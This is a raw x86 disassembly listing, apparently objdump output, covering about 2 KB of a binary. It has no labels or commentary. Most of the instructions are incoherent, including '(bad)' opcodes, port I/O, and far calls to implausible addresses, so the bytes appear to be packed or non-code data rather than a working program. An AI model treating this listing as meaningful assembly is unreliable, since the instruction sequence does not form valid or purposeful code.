  405fac:	adc    dh,BYTE PTR [eax]
  405fae:	sub    DWORD PTR [ebp+edx*1+0x10a443cf],ecx
  405fb5:	fs push edi
  405fb7:	dec    esp
  405fb8:	xor    eax,0x6d5f095
  405fbd:	push   ecx
  405fbe:	std    
  405fbf:	xchg   ebx,eax
  405fc0:	lahf   
  405fc1:	mov    edx,0xed1253b5
  405fc6:	pop    esi
  405fc7:	cmp    DWORD PTR [edx-0x41],ebx
  405fca:	mov    ah,0x6d
  405fcc:	cmp    bl,BYTE PTR [esi-0x3230c731]
  405fd2:	push   es
  405fd3:	lea    ebp,[esi+0xc]
  405fd6:	inc    ecx
  405fd7:	inc    esp
  405fd8:	(bad)  
  405fd9:	lods   eax,DWORD PTR ds:[esi]
  405fda:	xor    eax,0x6ac8a4d1
  405fdf:	xor    eax,0x7dcb4d74
  405fe4:	mov    ah,0xb7
  405fe6:	sbb    al,0x77
  405fe8:	mov    al,ds:0x74cfea23
  405fed:	jecxz  0x405fe8
  405fef:	data16 mov al,dl
  405ff2:	das    
  405ff3:	mov    ?,WORD PTR [ebp+ebp*8+0x6c]
  405ff7:	call   0xf7bc2fe8
  405ffc:	mov    WORD PTR [ecx+0x6e],fs
  405fff:	xchg   esi,eax
  406000:	cmp    eax,0xfd26fa7
  406005:	xchg   esp,eax
  406006:	mov    cl,0x85
  406008:	jg     0x406055
  40600a:	imul   ebp,ebp,0xffffffbc
  40600d:	sbb    BYTE PTR [esi-0x4],ch
  406010:	xor    BYTE PTR [eax-0x6e],al
  406013:	test   al,0xe0
  406015:	push   ecx
  406016:	repnz pop ecx
  406018:	repnz add al,0xea
  40601b:	out    0xfd,al
  40601d:	repnz mov esi,0x678801eb
  406023:	loopne 0x405fc5
  406025:	inc    eax
  406026:	ja     0x405faf
  406028:	(bad)  
  406029:	clc    
  40602a:	std    
  40602b:	icebp  
  40602c:	push   ds
  40602d:	inc    ebp
  40602e:	or     al,0x6c
  406030:	add    DWORD PTR [edi],edi
  406032:	sbb    BYTE PTR [eax-0x6e],bh
  406035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406036:	and    ebx,ebx
  406038:	or     al,BYTE PTR [edi]
  40603a:	sar    DWORD PTR [esi+0x7b04b52e],cl
  406040:	push   ds
  406041:	jmp    0x18a08ad9
  406046:	sub    ebp,DWORD PTR [ecx+0x1b]
  406049:	pop    edx
  40604a:	mov    esi,0x1491aa81
  40604f:	push   0xfffffff3
  406051:	mov    eax,DWORD PTR [esi]
  406053:	call   0x8a71:0x40100898
  40605a:	and    BYTE PTR [edi],cl
  40605c:	bound  esp,QWORD PTR [ebp+ebp*8+0x55]
  406060:	adc    eax,0x4af242b7
  406065:	sbb    bh,BYTE PTR [esp-0x7aab8fe9]
  40606c:	and    al,0xf1
  40606e:	dec    ebp
  40606f:	out    dx,eax
  406070:	cmp    eax,0xc7418d02
  406075:	outs   dx,BYTE PTR ds:[esi]
  406076:	push   ss
  406077:	and    cl,BYTE PTR [edx+0x43e292b9]
  40607d:	cmp    ebx,DWORD PTR [eax+0x1063d665]
  406083:	add    al,0x9f
  406085:	xchg   ebx,eax
  406086:	xor    al,0x11
  406088:	int3   
  406089:	mov    BYTE PTR [ecx+eiz*8-0x11959019],ch
  406090:	sub    eax,0x930bdb56
  406095:	adc    eax,0xc84223f6
  40609a:	xchg   ebx,eax
  40609b:	popa   
  40609c:	(bad)  
  40609d:	mov    dh,0xc0
  40609f:	iret   
  4060a0:	xchg   ebx,eax
  4060a1:	call   esp
  4060a3:	lahf   
  4060a4:	into   
  4060a5:	mov    ?,WORD PTR [ebp-0xa]
  4060a8:	mov    ds:0x17a52954,eax
  4060ad:	shl    BYTE PTR gs:[esi-0x931a484],0xaf
  4060b5:	inc    esi
  4060b6:	out    dx,al
  4060b7:	mov    ?,WORD PTR [ecx]
  4060b9:	into   
  4060ba:	pop    esi
  4060bb:	(bad)
  4060bf:	mov    DWORD PTR [ebx-0x602b5f24],edx
  4060c5:	mov    ch,0xde
  4060c7:	sti    
  4060c8:	xor    eax,0x7382d0e0
  4060cd:	fidiv  WORD PTR [edx-0x2e6ad878]
  4060d3:	dec    ebp
  4060d4:	scas   eax,DWORD PTR es:[edi]
  4060d5:	jmp    0x406076
  4060d7:	lods   al,BYTE PTR ds:[esi]
  4060d8:	(bad)  
  4060d9:	push   0xffffffd3
  4060db:	adc    BYTE PTR [esi+0x6a33a889],0x4e
  4060e2:	cmp    BYTE PTR [ebx],0xd4
  4060e5:	push   ebx
  4060e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e7:	stc    
  4060e8:	imul   esi,edi,0x71
  4060eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ec:	cmp    ah,ah
  4060ee:	cmp    al,0x6b
  4060f0:	jo     0x4060ef
  4060f2:	cld    
  4060f3:	push   ecx
  4060f4:	(bad)  
  4060f5:	psadbw mm1,mm5
  4060f8:	push   es
  4060f9:	or     eax,0x82349140
  4060fe:	pushf  
  4060ff:	mov    bh,0x5
  406101:	inc    ebx
  406102:	mov    ds:0x8f7c7cd6,eax
  406107:	push   eax
  406108:	mov    ah,0x93
  40610a:	imul   edx,edi,0x74d01171
  406110:	stos   DWORD PTR es:[edi],eax
  406111:	ror    BYTE PTR [edi-0x2e],0x31
  406115:	fincstp 
  406117:	pop    ebx
  406119:	sbb    DWORD PTR [ebp+esi*4+0x3f],edx
  40611d:	add    dh,BYTE PTR [ebx+ebx*8-0x43]
  406121:	jno    0x4060bd
  406123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406124:	push   ebp
  406125:	push   0x5679ba15
  40612a:	imul   esi,ebp,0x6a
  40612d:	fs rol DWORD PTR gs:[esi+0x4577e85d],cl
  406135:	cwde   
  406136:	(bad)  
  406137:	in     al,dx
  406138:	mov    al,ds:0x1e5541b0
  40613d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40613e:	jmp    0xaed4:0xfd2d7da0
  406145:	jp     0x406139
  406147:	cmp    bl,BYTE PTR [esi-0x40]
  40614a:	mov    ecx,0x28aa7946
  40614f:	js     0x40617e
  406151:	push   cs
  406152:	fiadd  WORD PTR [ecx-0x5117deb2]
  406158:	in     eax,0x69
  40615a:	or     al,0x9a
  40615c:	mov    ebx,0x2d4a49df
  406161:	daa    
  406162:	out    0x63,al
  406164:	jb     0x40611b
  406166:	jns    0x4061e1
  406168:	xor    bh,BYTE PTR [edi-0x33]
  40616b:	bound  esp,QWORD PTR [ebx+0xb]
  40616e:	inc    esp
  40616f:	bound  ebx,QWORD PTR [edi-0x6f]
  406172:	or     BYTE PTR [eax+eax*2-0x5eabc7ed],bl
  406179:	ret    
  40617a:	add    ch,al
  40617c:	xchg   ebx,eax
  40617d:	dec    esi
  40617e:	jl     0x40611d
  406180:	retf   
  406181:	stc    
  406182:	out    dx,eax
  406183:	xchg   ebx,esi
  406185:	(bad)  [eax-0x61]
  406188:	sbb    BYTE PTR [ebx*1-0x1e1e8bd6],al
  40618f:	popa   
  406190:	xor    BYTE PTR [edx],dh
  406192:	call   0xdc7e3d35
  406197:	lahf   
  406198:	xchg   cl,al
  40619a:	lds    ebx,FWORD PTR [eax]
  40619c:	sbb    al,0xe9
  40619e:	fild   WORD PTR [ecx]
  4061a0:	scas   al,BYTE PTR es:[edi]
  4061a1:	and    DWORD PTR [eax+0x538a417a],eax
  4061a7:	xchg   edx,eax
  4061a8:	xchg   BYTE PTR [edi+0x14f81dd4],bl
  4061ae:	(bad)  
  4061af:	out    0xa7,al
  4061b1:	in     al,0xfc
  4061b3:	ss rcl ah,0x1b
  4061b7:	and    eax,0x9795c8b2
  4061bc:	fld    QWORD PTR [esi]
  4061be:	or     al,0x59
  4061c0:	pop    ebp
  4061c1:	jns    0x406146
  4061c3:	addr16 enter 0x294a,0xa
  4061c8:	pop    ds
  4061c9:	dec    esp
  4061ca:	in     eax,dx
  4061cb:	and    dh,BYTE PTR [eax-0x783ca270]
  4061d1:	outs   dx,DWORD PTR ds:[esi]
  4061d2:	jecxz  0x406187
  4061d4:	jo     0x40616b
  4061d6:	loop   0x406163
  4061d8:	in     eax,dx
  4061d9:	loop   0x4061fa
  4061db:	int    0x3c
  4061dd:	leave  
  4061de:	pop    ecx
  4061df:	pop    ss
  4061e0:	sub    ecx,edx
  4061e2:	call   0x7a2f:0x3e9ac4d0
  4061e9:	shl    DWORD PTR [ecx],0x28
  4061ec:	ret    0xb7f2
  4061ef:	ins    BYTE PTR es:[edi],dx
  4061f0:	loop   0x40619c
  4061f2:	add    ebx,DWORD PTR [esp+eiz*8-0xf57ad61]
  4061f9:	in     al,0x4
  4061fb:	xor    ah,BYTE PTR ds:0xc36e4d0f
  406201:	mov    dh,0x89
  406203:	push   edi
  406204:	xchg   ebp,eax
  406205:	neg    DWORD PTR [edx+esi*2+0x4c11a65c]
  40620c:	sub    eax,0xd8bb8db0
  406211:	bound  edx,QWORD PTR [esi+ebx*8+0xd]
  406215:	call   0x9955e7df
  40621a:	test   BYTE PTR [edx-0x77],ch
  40621d:	sar    DWORD PTR [eax+0x6e],cl
  406220:	loopne 0x406225
  406222:	imul   edi,DWORD PTR [eax],0x2a7f0854
  406228:	xor    eax,DWORD PTR [edx-0x39ebf922]
  40622e:	push   ecx
  40622f:	fnsave [ebp-0x67e3e552]
  406235:	or     DWORD PTR [edx-0x2f7e1587],edx
  40623b:	js     0x4061e4
  40623d:	inc    ebp
  40623e:	adc    eax,0x484fa05c
  406243:	adc    cl,BYTE PTR [edi-0x2f51072a]
  406249:	stos   BYTE PTR es:[edi],al
  40624a:	fidivr WORD PTR [eax]
  40624c:	retf   
  40624d:	cmp    edi,eax
  40624f:	popf   
  406250:	xchg   ecx,eax
  406251:	sar    DWORD PTR [ebx],cl
  406253:	in     eax,dx
  406254:	in     eax,dx
  406255:	enter  0x2c40,0x47
  406259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40625a:	jl     0x4061df
  40625c:	bound  ebx,QWORD PTR [esi]
  40625e:	daa    
  40625f:	inc    edx
  406260:	adc    BYTE PTR [eax],al
  406262:	mov    esi,0xd14e2fb1
  406267:	jbe    0x406297
  406269:	cmp    bl,BYTE PTR [ebx+ecx*1]
  40626c:	pop    ebp
  40626d:	dec    edx
  40626e:	mov    ds:0xad153f93,eax
  406273:	scas   al,BYTE PTR es:[edi]
  406274:	xor    DWORD PTR [eax],ebp
  406276:	mov    ebp,cs
  406278:	xchg   esi,eax
  406279:	mov    dh,0xd3
  40627b:	addr16 mov edx,0x9cca2bcd
  406281:	cmc    
  406282:	ror    DWORD PTR [edi+0x0],1
  406285:	sub    cl,ah
  406287:	cwde   
  406288:	sub    cl,BYTE PTR [ecx-0x34]
  40628b:	sbb    al,0xde
  40628d:	sbb    esi,esi
  40628f:	idiv   BYTE PTR [esi]
  406291:	fs sar dh,cl
  406294:	mov    cl,0xee
  406296:	(bad)  
  406297:	popa   
  406298:	out    dx,al
  406299:	je     0x40624a
  40629b:	sub    ah,cl
  40629d:	xor    eax,0xefb0ec6c
  4062a2:	adc    ebp,DWORD PTR [ecx+0x5cd2d570]
  4062a8:	imul   BYTE PTR [ecx]
  4062aa:	and    al,0x2e
  4062ac:	gs repnz (bad) 
  4062af:	mov    al,ds:0x8f56b3df
  4062b4:	mov    eax,0x92fc36aa
  4062b9:	xlat   BYTE PTR ds:[ebx]
  4062ba:	push   edx
  4062bb:	rcr    BYTE PTR [esi],cl
  4062bd:	cmp    ebx,0x9a63f515
  4062c3:	adc    eax,0xc4a4436b
  4062c8:	sahf   
  4062c9:	(bad)  
  4062cb:	or     eax,0xa29ad2ba
  4062d0:	lds    esp,FWORD PTR [esi+0x75b6e7a]
  4062d6:	call   0xf72b284d
  4062db:	mov    al,ds:0xea93c3f3
  4062e0:	loopne 0x40629b
  4062e2:	sar    cl,cl
  4062e4:	loop   0x4062e0
  4062e6:	lods   al,BYTE PTR ds:[esi]
  4062e7:	add    eax,0x9c881cf8
  4062ec:	cmc    
  4062ed:	jb     0x406321
  4062ef:	push   edx
  4062f0:	add    BYTE PTR [esi-0x13b4100],dl
  4062f6:	push   eax
  4062f7:	pop    ebp
  4062f8:	fwait
  4062f9:	adc    ecx,DWORD PTR ds:0xeeb642c2
  4062ff:	arpl   WORD PTR [ebp+0x4b],sp
  406302:	bswap  edi
  406304:	setb   BYTE PTR [ecx+0x491d16ff]
  40630b:	fmul   st(6),st
  40630d:	sub    eax,0xffffffa2
  406310:	dec    eax
  406311:	shl    BYTE PTR [ebx+0x12],1
  406314:	cmp    esp,DWORD PTR [ecx+0x684b0817]
  40631a:	retf   
  40631b:	mov    al,0x76
  40631d:	arpl   WORD PTR [esi+0x41],sp
  406320:	adc    ch,BYTE PTR [ebp+0x306a388b]
  406326:	pop    esi
  406327:	cmp    eax,0x666add25
  40632c:	retf   0xa91c
  40632f:	mov    al,0x5d
  406331:	mov    bl,0x61
  406333:	out    0x3a,al
  406335:	js     0x4063b3
  406337:	shl    DWORD PTR [ebp-0x25],0xd7
  40633b:	out    dx,eax
  40633c:	lods   al,BYTE PTR ds:[esi]
  40633d:	jo     0x40638a
  40633f:	sub    al,0x49
  406341:	mov    BYTE PTR [ecx+eax*1],ah
  406344:	cwde   
  406345:	inc    edi
  406346:	jmp    0x4063bc
  406348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406349:	addr16 inc eax
  40634b:	push   0x38b47f8f
  406350:	jns    0x40630b
  406352:	dec    esi
  406353:	or     eax,0x6227b125
  406358:	push   eax
  406359:	shl    DWORD PTR [edi+ebx*2-0x46],cl
  40635d:	(bad)  [edi]
  40635f:	rcl    DWORD PTR [ecx],0xc
  406362:	jl     0x406381
  406364:	sub    BYTE PTR [ebx+0x7d],0xce
  406368:	push   ds
  406369:	xchg   esi,eax
  40636a:	and    dl,dh
  40636c:	arpl   WORD PTR [edi+0x20],cx
  40636f:	stc    
  406370:	test   al,0xc6
  406372:	adc    BYTE PTR [eax],al
  406374:	jb     0x406396
  406376:	xor    ebx,ebx
  406378:	fadd   DWORD PTR [eax-0x3d]
  40637b:	jnp    0x40639d
  40637d:	or     eax,0xc69d8882
  406382:	aaa    
  406383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406384:	push   es
  406385:	and    al,0xc2
  406387:	cmp    edx,edi
  406389:	mov    eax,0x7a4767f1
  40638e:	mov    ebx,0xba5c5bec
  406393:	mov    DWORD PTR [edx+0x0],esi
  406396:	fist   DWORD PTR [edx-0x589ceec]
  40639c:	cld    
  40639d:	retf   
  40639e:	cmp    BYTE PTR [edi+0x6e],ah
  4063a1:	sahf   
  4063a2:	data16 loope 0x4063e5
  4063a5:	popa   
  4063a6:	cmp    ebp,DWORD PTR [ecx-0x76]
  4063a9:	xchg   esi,eax
  4063aa:	out    0xd5,al
  4063ac:	and    bl,dh
  4063ae:	ror    DWORD PTR [edx+0x3cb9151a],1
  4063b4:	mov    ecx,0xdb84e8b4
  4063b9:	add    BYTE PTR [edi-0x14374841],ah
  4063bf:	scas   al,BYTE PTR es:[edi]
  4063c0:	popa   
  4063c1:	pop    edx
  4063c2:	inc    ebp
  4063c3:	xor    al,0xd7
  4063c5:	sbb    eax,0x54ed80de
  4063ca:	repz div DWORD PTR [ebx]
  4063cd:	ds retf 
  4063cf:	push   ecx
  4063d0:	xchg   ebp,eax
  4063d1:	popa   
  4063d2:	repnz adc ecx,ecx
  4063d5:	push   edi
  4063d6:	inc    edx
  4063d7:	mov    dh,0x8d
  4063d9:	pushf  
  4063da:	js     0x40644d
  4063dc:	sub    eax,0x47b2e239
  4063e1:	or     esi,esp
  4063e3:	ficomp DWORD PTR [ebx+0x13b2a787]
  4063e9:	imul   esi,DWORD PTR [edx],0xffffffb5
  4063ec:	arpl   WORD PTR ds:0xb1f28f43,dx
  4063f2:	push   ebx
  4063f3:	inc    esi
  4063f4:	dec    ebx
  4063f5:	sub    al,0xeb
  4063f7:	pop    ds
  4063f8:	or     DWORD PTR [ebx-0x48d30ea0],eax
  4063fe:	sub    ch,BYTE PTR [ebx+esi*8-0x21]
  406402:	mov    DWORD PTR [edi-0x51],edi
  406405:	sbb    esi,DWORD PTR [edx-0xb]
  406408:	add    bl,ah
  40640a:	dec    esp
  40640b:	mov    esp,0xffa7fe2d
  406410:	xor    al,0x2b
  406412:	sub    ah,BYTE PTR [ebx-0x2a76dc5c]
  406418:	ins    DWORD PTR es:[edi],dx
  406419:	cwde   
  40641a:	call   0x4e48:0xcf54a851
  406421:	push   esi
  406422:	ds jge 0x406443
  406425:	dec    edx
  406426:	mov    ecx,0x3cea0408
  40642b:	and    DWORD PTR [esi-0x45],edi
  40642e:	xchg   esi,eax
  40642f:	pusha  
  406430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406431:	dec    ebp
  406432:	or     BYTE PTR [ebx-0x56eebfcb],cl
  406438:	sub    dh,BYTE PTR [eax+0x18ea3973]
  40643e:	or     bh,BYTE PTR [edi-0x60]
  406441:	adc    eax,0x448546a
  406446:	sbb    BYTE PTR [ebx-0x69],0xe2
  40644a:	mov    gs,WORD PTR [ecx-0xa68e96]
  406450:	out    dx,al
  406451:	sbb    esp,edx
  406453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406454:	jno    0x40642a
  406456:	xor    al,0x3f
  406458:	into   
  406459:	xor    cl,BYTE PTR [ecx+0x5ab4585b]
  40645f:	add    edx,esi
  406461:	or     BYTE PTR ds:0x4e97bb27,bl
  406467:	sub    dh,ch
  406469:	mov    ds:0x3a18d651,eax
  40646e:	dec    ebx
  40646f:	pop    ds
  406470:	mov    al,ds:0xa3624e33
  406475:	test   al,0x61
  406477:	or     al,BYTE PTR [ecx+0x6ea6c384]
  40647d:	fstp   DWORD PTR cs:[edx+0x5e0c92c9]
  406484:	imul   ebp,DWORD PTR [ebx+0x480b42ad],0x50d12f6f
  40648e:	push   ecx
  40648f:	add    BYTE PTR [eax],0x94
  406492:	jo     0x406489
  406494:	mov    dh,0x37
  406496:	neg    esi
  406498:	and    al,0xf2
  40649a:	dec    ebx
  40649b:	retf   
  40649c:	ins    DWORD PTR es:[edi],dx
  40649d:	les    ecx,FWORD PTR [ebx-0x16378781]
  4064a3:	loop   0x406474
  4064a5:	push   0x50
  4064a7:	xchg   ecx,eax
  4064a8:	call   0x93ac:0xdf0628f9
  4064af:	pop    ss
  4064b0:	and    al,BYTE PTR [ebp-0x3f]
  4064b3:	enter  0x5fb5,0xc5
  4064b7:	repnz sub al,0x38
  4064ba:	xchg   esi,eax
  4064bb:	in     al,dx
  4064bc:	dec    edi
  4064bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064be:	xchg   dl,bh
  4064c0:	mov    BYTE PTR [ebx],0xa7
  4064c3:	cmp    eax,0x6d87b177
  4064c8:	mov    esp,0xa4a161a5
  4064cd:	stc    
  4064ce:	dec    ebp
  4064cf:	sbb    ecx,DWORD PTR [esp+eax*8]
  4064d2:	or     DWORD PTR gs:[ebp+0x30b036dc],eax
  4064d9:	push   ss
  4064da:	jp     0x4064ba
  4064dc:	ror    DWORD PTR [edi+0x20],1
  4064df:	or     eax,DWORD PTR [edi+0x63]
  4064e2:	sbb    bl,bh
  4064e4:	dec    eax
  4064e5:	add    DWORD PTR [ebp+0x4723170e],0xffffffb4
  4064ec:	jnp    0x40651d
  4064ee:	xor    bh,dh
  4064f0:	js     0x406540
  4064f2:	push   0x8202ffe5
  4064f7:	and    BYTE PTR [ebp-0x50637524],ch
  4064fd:	mov    ah,0xb7
  4064ff:	xchg   DWORD PTR [ecx+ecx*4-0x2c],esp
  406503:	(bad)  
  406504:	mov    edi,0xff0230fa
  406509:	cs xchg esp,eax
  40650b:	dec    ebp
  40650c:	out    dx,al
  40650d:	mov    bh,0x1c
  40650f:	mov    ah,BYTE PTR [ecx+0x461bc663]
  406515:	scas   eax,DWORD PTR es:[edi]
  406516:	mov    ebp,0x606cf150
  40651b:	mov    DWORD PTR [esi-0x3f],ecx
  40651e:	mov    ebx,0x90a939b9
  406523:	add    al,0xdc
  406525:	adc    al,0xf4
  406527:	lock into 
  406529:	addr16 inc edi
  40652b:	push   cs
  40652c:	and    al,0x5
  40652e:	pop    ebx
  40652f:	popa   
  406530:	aad    0x7a
  406532:	jg     0x40652b
  406534:	in     eax,0x3c
  406536:	pop    ebx
  406537:	(bad)  
  406538:	outs   dx,DWORD PTR ds:[esi]
  406539:	retf   
  40653a:	lar    ebx,bp
  40653d:	dec    esi
  40653e:	pop    ebx
  40653f:	cmp    cl,dh
  406541:	ins    BYTE PTR es:[edi],dx
  406542:	pop    esi
  406543:	jne    0x4064f1
  406545:	and    edx,ebp
  406547:	sbb    BYTE PTR [ebp+0x35],0xe7
  40654b:	adc    eax,0x72df7a96
  406550:	cmp    al,0xf3
  406552:	inc    ecx
  406553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406554:	js     0x40651c
  406556:	jg     0x406571
  406558:	loope  0x40657b
  40655a:	jle    0x4065b4
  40655c:	loop   0x40659c
  40655e:	or     BYTE PTR [ecx+0x6e],0xa0
  406562:	xchg   ecx,eax
  406563:	and    DWORD PTR [edi-0x47],edx
  406566:	xor    al,0x5
  406568:	mov    al,ds:0x81eaaa02
  40656d:	jle    0x406588
  40656f:	dec    edi
  406570:	xchg   BYTE PTR [eax+0x40aa9975],dl
  406576:	pop    edx
  406577:	inc    ebp
  406578:	or     edx,DWORD PTR [esi-0x211a1c43]
  40657e:	aas    
  40657f:	adc    DWORD PTR [edi+ebx*2-0x5e630a6b],ebx
  406586:	push   cs
  406587:	xchg   BYTE PTR [ebx+0x66d35e13],cl
  40658d:	test   DWORD PTR [edi],edx
  40658f:	test   esi,ebp
  406591:	ror    BYTE PTR [edx-0x16e5d700],0x79
  406598:	dec    ax
  40659a:	sahf   
  40659b:	loop   0x4065fc
  40659d:	rcl    edi,1
  40659f:	sti    
  4065a0:	(bad)  
  4065a1:	(bad)  
  4065a2:	cmp    al,0x0
  4065a4:	das    
  4065a5:	adc    eax,0x1976915a
  4065aa:	jbe    0x406607
  4065ac:	pop    ss
  4065ad:	sub    ebp,DWORD PTR [edx+edx*4-0x7ba05e88]
  4065b4:	and    bl,0x2e
  4065b7:	xchg   edx,eax
  4065b8:	mov    cl,0x73
  4065ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065bb:	sbb    dh,ah
  4065bd:	mov    ?,WORD PTR [eax]
  4065bf:	cld    
  4065c0:	jno    0x40660f
  4065c2:	lods   al,BYTE PTR ds:[esi]
  4065c3:	mov    ds:0xfbad6638,al
  4065c8:	mov    eax,ds:0x7d2dbd2b
  4065cd:	cli    
  4065ce:	call   0x98c5:0x6f7b3459
  4065d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065d6:	sbb    al,0xf5
  4065d8:	and    al,0x6a
  4065da:	lods   eax,DWORD PTR ds:[esi]
  4065db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065dc:	xlat   BYTE PTR ds:[ebx]
  4065dd:	pop    ds
  4065de:	xor    eax,0xf744201
  4065e3:	xor    DWORD PTR [edi-0x6bd02464],eax
  4065e9:	add    ecx,edi
  4065eb:	mov    esi,0xc7ea2a40
  4065f0:	lods   eax,DWORD PTR ds:[esi]
  4065f1:	cwde   
  4065f2:	pushf  
  4065f3:	and    BYTE PTR [ebx+eiz*1],ch
  4065f6:	mov    al,0x39
  4065f8:	aas    
  4065f9:	dec    eax
  4065fa:	xchg   ebp,eax
  4065fb:	(bad)  
  4065fc:	jp     0x40664d
  4065fe:	sub    al,0xd6
  406600:	inc    ebp
  406601:	add    eax,0xa7a5e64c
  406606:	stos   DWORD PTR es:[edi],eax
  406607:	sub    edi,DWORD PTR [ebx]
  406609:	adc    esi,esp
  40660b:	jo     0x40668b
  40660d:	push   es
  40660e:	jno    0x40665c
  406610:	push   ebp
  406611:	sub    BYTE PTR [ecx-0x3c],al
  406614:	lahf   
  406615:	out    0x65,al
  406617:	test   eax,0x422fc012
  40661c:	mul    BYTE PTR [edi-0x1d4b3682]
  406622:	jae    0x406678
  406624:	int3   
  406625:	arpl   WORD PTR [edi-0x2b8d2a9f],dx
  40662b:	fisub  DWORD PTR [edx]
  40662d:	and    dl,BYTE PTR [ebx+0x1b]
  406630:	aam    0xa
  406632:	push   esp
  406633:	in     al,dx
  406634:	jne    0x40661d
  406636:	leave  
  406637:	or     BYTE PTR [ebx+0x1f],0x25
  40663b:	and    edi,ebp
  40663d:	call   0xe569:0xdee0dd9f
  406644:	fisttp DWORD PTR [esi-0x462a5193]
  40664a:	mov    ebp,0xc8745ba8
  40664f:	dec    ebx
  406650:	jnp    0x406687
  406652:	jno    0x4066bb
  406654:	sbb    DWORD PTR [esi-0xa],ebp
  406657:	sahf   
  406658:	outs   dx,BYTE PTR ds:[esi]
  406659:	in     al,dx
  40665a:	std    
  40665b:	enter  0x5b7c,0x9a
  40665f:	adc    ah,cl
  406661:	loopne 0x406685
  406663:	mov    bl,0xdc
  406665:	sub    al,0xa1
  406667:	jno    0x406683
  406669:	inc    edi
  40666a:	xchg   ah,ch
  40666c:	rol    DWORD PTR [eax+0x5b],1
  40666f:	xlat   BYTE PTR ds:[ebx]
  406670:	test   BYTE PTR [edx],0x6d
  406673:	inc    ecx
  406674:	stos   DWORD PTR es:[edi],eax
  406675:	fmul   QWORD PTR ds:0x32d71919
  40667b:	int    0x5d
  40667d:	push   esi
  40667e:	and    al,0xdc
  406680:	sbb    bh,cl
  406682:	nop
  406683:	fst    DWORD PTR [ecx+eiz*8+0x5326baed]
  40668a:	mov    dh,0x14
  40668c:	jecxz  0x4066d5
  40668e:	push   ds
  40668f:	add    edx,DWORD PTR [ebx]
  406691:	sub    DWORD PTR [ebx],ebx
  406693:	add    ecx,DWORD PTR [ecx]
  406695:	retf   0xb077
  406698:	test   DWORD PTR [ecx+0x5f88f207],ebp
  40669e:	xor    bl,bh
  4066a0:	imul   eax,DWORD PTR [esi+0x3c],0x75
  4066a4:	mov    ds:0xb5d73edd,al
  4066a9:	repz push eax
  4066ab:	pop    esp
  4066ac:	ins    BYTE PTR es:[edi],dx
  4066ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ae:	in     eax,0x32
  4066b0:	iret   
  4066b1:	mov    esi,0xb328c8dd
  4066b6:	(bad)  
  4066b7:	call   0xe925:0xedac788c
  4066be:	ins    DWORD PTR es:[edi],dx
  4066bf:	(bad)  
  4066c0:	loopne 0x406724
  4066c2:	lods   eax,DWORD PTR ds:[esi]
  4066c3:	mov    esi,0xf858fa40
  4066c8:	lods   al,BYTE PTR ds:[esi]
  4066c9:	cwde   
  4066ca:	retf   0x22d
  4066cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ce:	aaa    
  4066cf:	enter  0x2dff,0x7
  4066d3:	push   ecx
  4066d4:	lock push 0x29fe1d8b
  4066da:	enter  0x889d,0x7b
  4066de:	mov    al,ds:0xfc46604a
  4066e3:	cmp    edi,ebx
  4066e5:	imul   edx,ebp,0xffffffaa
  4066e8:	add    ch,BYTE PTR [eax]
  4066ea:	es push eax
  4066ec:	imul   esp,DWORD PTR [edx],0x74f3d11b
  4066f2:	jbe    0x406696
  4066f4:	add    eax,0x8074edef
  4066f9:	scas   al,BYTE PTR es:[edi]
  4066fa:	mov    esi,0xacd87f82
  4066ff:	sbb    ebx,DWORD PTR [eax+0xc]
  406702:	int3   
  406703:	fst    DWORD PTR [ecx]
  406705:	shr    BYTE PTR [esi+0x74],cl
  406708:	and    edi,DWORD PTR [ebx]
  40670a:	adc    ch,bl
  40670c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40670d:	leave  
  40670e:	ja     0x5c9ac9dd
  406714:	pop    edx
  406715:	or     eax,0xf45dfbaf
  40671a:	out    dx,eax
  40671b:	xchg   esi,eax
  40671c:	inc    eax
  40671d:	cmp    DWORD PTR [eax+0x76],ecx
  406720:	inc    esi
  406721:	sbb    al,0x7a
  406723:	js     0x4066dc
  406725:	mov    edx,esi
  406727:	rcl    BYTE PTR [eax+0x9f1dc9b],0x77
  40672e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40672f:	stos   DWORD PTR es:[edi],eax
  406730:	and    DWORD PTR [edi+0x7e23fed2],edx
  406736:	pop    edi
  406737:	fimul  DWORD PTR [eax-0x4a]
  40673a:	(bad)  
  40673b:	clc    
  40673c:	xchg   ebx,eax
  40673d:	fldln2 
  40673f:	and    esp,DWORD PTR [edi+0x40]
  406742:	retf   0xf411
  406745:	std    
  406746:	mov    esp,DWORD PTR [ecx-0x60]
  406749:	jmp    0x2a50a376
  40674e:	hlt    
  40674f:	adc    BYTE PTR [ecx+0x4f09eeea],cl
  406755:	push   ecx
  406756:	dec    esp
  406757:	mov    ebp,0xda2e926d
  40675c:	bound  ebx,QWORD PTR [ecx]
  40675e:	xchg   esi,eax
  40675f:	dec    edi
  406760:	push   ss
  406761:	clc    
  406762:	es loop 0x406785
  406765:	cli    
  406766:	test   BYTE PTR ds:0xe3358ad4,ah
  40676c:	mov    ch,0x69
  40676e:	mov    WORD PTR [edi+0x12],fs
  406771:	ficomp DWORD PTR [esi]
  406773:	mov    bh,ah
  406775:	rcr    DWORD PTR [ebp-0x41069344],cl
  40677b:	xor    BYTE PTR [ebp+0x2e3b8ec5],dl
  406781:	nop
  406782:	mov    si,0x3c26
  406786:	int    0x7e
  406788:	in     al,0xe4
  40678a:	inc    edi
  40678b:	fwait
  40678c:	ss cwde 
  40678e:	pop    eax
  40678f:	ret    0xc4b2
  406792:	aad    0x59
